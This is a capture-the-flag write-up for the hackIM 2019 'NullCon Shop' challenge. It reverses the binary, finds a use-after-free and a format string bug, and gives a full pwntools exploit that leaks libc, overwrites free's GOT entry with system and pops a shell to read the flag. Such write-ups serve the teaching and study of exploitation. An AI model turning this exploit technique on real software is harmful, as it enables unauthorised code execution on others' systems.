# hackIM Shop

### Reversing

Let's take a look at the binary:
```
$    file challenge
challenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=fe602c2cb2390d3265f28dc0d284029dc91a2df8, not stripped
$    pwn checksec challenge
[*] '/Hackery/hackIM/store/challenge'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we are dealing with a `64` bit binary with no PIE or RELRO. When we run the binary, we see that we have the option to add, remove and view books. When we take a look at the main function in Ghidra, we see this:

```
void main(void)

{
  int option;
  ssize_t bytesRead;
  long menInput;
  char menuInput [8];
 
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  do {
    while( true ) {
      menu();
      bytesRead = read(0,menuInput,2);
      if (bytesRead != 0) break;
      perror("Err read option\r\n");
    }
    menInput = atol(menuInput);
    option = (int)menInput;
    if (option == 2) {
      remove_book();
    }
    else {
      if (option == 3) {
        view_books();
      }
      else {
        if (option == 1) {
          add_book();
        }
        else {
          puts("Invalid option");
        }
      }
    }
  } while( true );
}
```

So we can see the main function, it essentially just acts as a menu which launches the `remove_book`, `view_books`, and `add_book` functions. Looking at the `add_book` function we see this:

```
void add_book(void)

{
  void *ptr0;
  ulong __size;
  void *ptr1;
  size_t nameLen;
  size_t nameLen1;
  undefined8 price;
  long in_FS_OFFSET;
  int index;
  long canary;
  long name;
  long name1;
 
  canary = *(long *)(in_FS_OFFSET + 0x28);
  if (num_books == 0x10) {
    puts("Cart limit reached!");
  }
  else {
    ptr0 = malloc(0x38);
    printf("Book name length: ");
    __size = readint();
    if (__size < 0x100) {
      printf("Book name: ");
      ptr1 = malloc(__size);
      *(void **)((long)ptr0 + 8) = ptr1;
      read(0,*(void **)((long)ptr0 + 8),__size);
      name = *(long *)((long)ptr0 + 8);
      nameLen = strlen(*(char **)((long)ptr0 + 8));
      if (*(char *)((nameLen - 1) + name) == '\n') {
        name1 = *(long *)((long)ptr0 + 8);
        nameLen1 = strlen(*(char **)((long)ptr0 + 8));
        *(undefined *)((nameLen1 - 1) + name1) = 0;
      }
      printf("Book price: ");
      price = readint();
      *(undefined8 *)((long)ptr0 + 0x10) = price;
      index = 0;
      while (*(long *)(books + (long)index * 8) != 0) {
        index = index + 1;
      }
      *(void **)(books + (long)index * 8) = ptr0;
      **(long **)(books + (long)index * 8) = (long)index;
      num_books = num_books + 1;
      strcpy((char *)(*(long *)(books + (long)index * 8) + 0x18),cp_stmt);
    }
    else {
      puts("Too big!");
    }
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

So here is the function which adds books. We can see that it first allocates a chunk of memory with malloc (size `0x38`), then allocates a second chunk of memory with malloc, and the ptr to that is stored in the first chunk of memory at offset `8`. In the second chunk of memory, we get to scan in up to `0xff` bytes of memory (depending on what we give it as a size), and the chunk of memory scales with it. After that it prompts us for the price of the books. Finally it stores the initial pointer in `books` which is the bss address `0x6021a0`, increments the count of books `num_books` (bss address `0x6020e0`), and then copies the string `Copyright NullCon Shop` stored in `cp_stmt` to the first chunk of memory. Also there is a limit of `0xf` on how many books we can have allocated at a time. Reversing out everything, we can see that this is how the data is structured:

Books is a single array of heap pointers:

```
gef➤  x/2g 0x6021a0
0x6021a0 <books>: 0x0000000000603260  0x00000000006032c0
```

Each book has the following structure:
```
0x0:    Int contains index of book
0x8:    Ptr to name of book
0x10:   len of book name
0x18:   The string ""Copyright NullCon Shop"
```

Which we can see that layout in gdb:
```
gef➤  x/10g 0x6032c0
0x6032c0: 0x0000000000000001  0x0000000000603300
0x6032d0: 0x0000000000000019  0x6867697279706f43
0x6032e0: 0x6f436c6c754e2074  0x0000706f6853206e
0x6032f0: 0x0000000000000000  0x0000000000000031
0x603300: 0x3639383532313437  0x0000000000000000
```

Looking at the `view_books` function, we see this:

```
void view_books(void)

{
  undefined8 uVar1;
  int index;
 
  puts("{");
  puts("\t\"Books\" : [");
  index = 0;
  while (index < 0x10) {
    if (*(long *)(books + (long)index * 8) != 0) {
      uVar1 = **(undefined8 **)(books + (long)index * 8);
      puts("\t\t{");
      printf("\t\t\t\"index\": %ld,\n",uVar1);
      printf("\t\t\t\"name\": \"%s\",\n",*(undefined8 *)(*(long *)(books + (long)index * 8) + 8));
      printf("\t\t\t\"price\": %ld,\n",*(undefined8 *)(*(long *)(books + (long)index * 8) + 0x10));
      printf("\t\t\t\"rights\": \"");
      printf((char *)(*(long *)(books + (long)index * 8) + 0x18));
      puts("\"");
      if (*(long *)(books + (long)(index + 1) * 8) == 0) {
        puts("\t\t}");
      }
      else {
        puts("\t\t},");
      }
    }
    index = index + 1;
  }
  puts("\t]");
  puts("}");
  return;
}
```

Here we can see the `view_books` function, which prints out the various info about the books. We can see that there is a format string bug with `printf((char *)(*(long *)(books + (long)index * 8) + 0x18));`, since it is printing a non static string without a specific format string. However we will need another bug to effectively use it. Looking at the `remove_book` function we see this:

```
void remove_book(void)

{
  ulong index;
 
  printf("Book index: ");
  index = readint();
  if (index < (ulong)num_books) {
    free(*(void **)(*(long *)(books + index * 8) + 8));
    free(*(void **)(books + index * 8));
    num_books = num_books - 1;
  }
  else {
    puts("Invalid index");
  }
  return;
}
```

Here we can see is the `remove_book` function. It checks to see if the book is valid by checking if the index given is larger than the count of currently allocated books `num_books`, which is a bug. However we see that if the check is passed, that it just frees the two pointers for the associated bug, and decrements `num_books`. However after it frees the pointers, it doesn't get rid of them from `books` (or anywhere else), and doesn't directly edit the data stored there (unless free/malloc does), so we have a use after free bug here.

### Infoleak

Since PIE is disabled, we know the addresses of the got table entries. Since RELRO is disabled, we can write to it. Our plan will essentially be to overwrite a pointer that is printed with that of a got table address, and print it, using the use after free bug. This will print out the libc address for the corresponding function for the got table, which we can use to calculate the address of `system` (with gdb, we can print the addresses of the functions and see the offset). From there we will use the use after free bug to overwrite the rights sections of the books with format strings, to overwrite the got table entry for free with `system` (since free is bassed a pointer to data we control, it will make passing a char pointer `/bin/sh\x00` to `system` easy).

For leaking the libc address, I started off by just allocating a lot of books of the same size (`50` because I felt like it). After that, I removed a lot of the books I allocated, then allocated one more, and checked with gdb to see the offset between that and a pointer which is printed. Here is an example in gdb, where I allocated five `50` byte chunks, freed them, then allocated a new book with the name `15935728`:

```
Legend: code, data, rodata, value
Stopped reason: SIGINT
0x00007ffff7af4081 in __GI___libc_read (fd=0x0, buf=0x7fffffffdf80, nbytes=0x2)
    at ../sysdeps/unix/sysv/linux/read.c:27
27    ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
gdb-peda$ find 15935728
Searching for '15935728' in: None ranges
Found 1 results, display max 1 items:
[heap] : 0x603360 ("15935728\n3`")
gdb-peda$ x/x 0x603360
0x603360:    0x31
gdb-peda$ x/5g 0x603360
0x603360:    0x3832373533393531    0x000000000060330a
0x603370:    0x0000000000000005    0x6867697279706f43
0x603380:    0x6f436c6c754e2074
```

As you can see, it is just eight bytes from the start of our input before we start overwriting (and we can see, that I even overwrote the least significant byte of the pointer with a newline `0x0a` character). We can tell that this is a pointer to a book, since the address `0x603360` (which is eight bytes before the start of the pointer) is stored in `books`, which from our earlier work we know that the pointer here is to name. With that, we can just write `8` bytes to reach the pointer, overwrite it with a got table address. After that we can just view the books, and we will have our libc infoleak.

### Format String

Now that we have the libc leak, we know where the address of system is thanks to the libc infoleak. We will now exploit the format string bug to write the address of system to the got address of free, by overwriting the string `Copyright NullCon Shop` which is printed without a format string. After that we should be able to delete a book with the name `/bin/sh\x00` and it should give us a shell. Looking in gdb, with books allocated for 50 byte names, we see that the offset from the start of our new books to the string `Copyright NullCon Shop` (after we allocate and free a bunch of books) is `24` bytes. Using the traditional method of seeing where our input is on the stack with (check the format string module for more on that, however since it is `64` bit you will have to use `%lx` ) we can see that the start of our input can be reached at `%7$lx` (input being first eight bytes of the new book name).   

Now for the actual write itself, I will do three writes of two bytes each. The reason for this being, we can see using the infoleak that libc addresses for the binary, the highest two bytes are 0x0000, which are taken care of by the format string write (since if we write `0x0a`, it will append null bytes to the front of it due to the data value being written). This just leaves us with 6 bytes essentially that we need to worry about being written. I decided to just do three writes of two bytes each (just a balance between the amount of bytes being written versus number of writes I decided on). We need to do multiple writes, since when we do a format string write, it will print the amount of bytes equivalent to the write, and if we were to do it all in one giant write it would crash usually. Also we needed to write the lowest two bytes, then the second lowest two bytes, and then finally the third lowest two bytes, because of the additional zeroes, we would be overwriting data we have written with a previous write. To find out the order of the writes, we just look at the order in which they are printed (first data printed = first write). Also to specify amount of bytes being written we will just append `%Yx` right before the `%7$n`, to write `Y` bytes (for instance `%5x` to write 5 bytes). With all of this, we can write our exploit.

### Exploit

Putting it all together, we get the following exploit. Also when I was doing the exploit dev for this one, I'm not sure why but I had some I/O issues. In addition to that, this exploit is dependent on the libc version. So if you have a different libc version, you will need to swap out the libc file in the exploit:

```
from pwn import *

target = process('./challenge')
libc = ELF('./libc-2.27.so')# If you have a different libc version, swap it out here
#gdb.attach(target)

# function to add books
def addBook(size, price, payload):
    target.sendline('1')
    target.sendline(str(size))
    target.send(payload)
    target.sendline(str(price))
    print target.recvuntil('>')

# function to add books with a null byte in it's name
# for some reason, we need to send an additional byte
def addBookSpc(size, price, payload):
  target.sendline("1")
  target.sendline(str(size))
  target.sendline(payload)
  target.sendline("7")
  target.recvuntil(">")

# this is a function to delete books
def deleteBook(index):
    target.sendline('2')
    target.sendline(str(index))
    target.recvuntil('>')

# add a bunch of books to use late with the use after free
addBook(50, 5, "0"*50)
addBook(50, 5, "1"*50)
addBook(50, 5, "2"*50)
addBook(50, 5, "3"*50)
addBook(50, 5, "4"*50)
addBook(50, 5, "5"*50)
addBook(50, 5, "6"*50)
addBookSpc(50, 5, "/bin/sh\x00") # this book will contain the "/bin/sh" string to pass a pointer to free
addBook(50, 5, "8"*50)
addBook(50, 5, "9"*50)
addBook(50, 5, "x"*50)
addBook(50, 5, "y"*50)
addBook(50, 5, "9"*50)
addBook(50, 5, "q"*50)


# delete the books, to setup the use after free
deleteBook(0)
deleteBook(1)
deleteBook(2)
deleteBook(3)
deleteBook(4)
deleteBook(5)
deleteBook(6)
deleteBook(7)
deleteBook(8)
deleteBook(9)
deleteBook(10)
deleteBook(11)
deleteBook(12)
deleteBook(13)
deleteBook(14)


# This is the initial overflow of a pointer with the got address of `puts` to get the libc infoleak
addBookSpc(50, 5, "15935728"*1 + p64(0x602028) + "z"*8 + "%7$lx.")

# Display all of the books, to get the libc infoleak
target.sendline('3')

# Filter out the infoleak
print target.recvuntil('{')
print target.recvuntil('{')
print target.recvuntil('{')
print target.recvuntil('{')

print target.recvuntil("\"name\": \"")

leak = target.recvuntil("\"")
leak = leak.replace("\"", "")
print "leak is: " + str(leak)
leak = u64(leak + "\x00"*(8 - len(leak)))

# Subtract the offset to system from puts from the infoleak, to get the libc address of system
libcBase = leak - libc.symbols['puts']
system = libcBase + libc.symbols['system']

print "system address: " + hex(leak)

# do a bit of binary math to get the
part0 = str(system & 0xffff)
part1 = str(((system & 0xffff0000) >> 16))
part2 = str(((system & 0xffff00000000) >> 32))

print "part 0: " + hex(int(part0))
print "part 1: " + hex(int(part1))
print "part 2: " + hex(int(part2))


# Add the three books to do the format string
# We need the 0x602028 address still to not cause a segfault when it prints
# the got address we are trying to overwrite is at 0x602018

addBookSpc("50", "5", p64(0x60201a) + p64(0x602028) + "z"*8 + "%" + part1 + "x%7$n")
addBookSpc("50", "5", p64(0x602018) + p64(0x602028) + "z"*8 + "%" + part0 + "x%7$n")
addBookSpc("50", "5", p64(0x60201c) + p64(0x602028) + "z"*8 + "%" + part2 + "x%7$n")

# Print the books to execute the format string write
target.sendline('3')

# Free the book with "/bin/sh" to pass a pointer to "/bin/sh" to system
target.sendline('2')
target.sendline('7')

# Drop to an interactive shell
target.interactive()
```

and when we run the remote exploit:

```
$ python exploit.py
[+] Opening connection to pwn.ctf.nullcon.net on port 4002: Done
NullCon Shop
(1) Add book to cart
(2) Remove from cart
(3) View cart
(4) Check out

. . .

$ w
 18:51:13 up 7 days,  3:10,  0 users,  load average: 0.03, 0.13, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
$ ls
challenge
flag
$ cat flag
hackim19{h0p3_7ha7_Uaf_4nd_f0rm4ts_w3r3_fun_4_you}
$ w
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to pwn.ctf.nullcon.net port 4002
```

Just like that, we get the flag `hackim19{h0p3_7ha7_Uaf_4nd_f0rm4ts_w3r3_fun_4_you}`


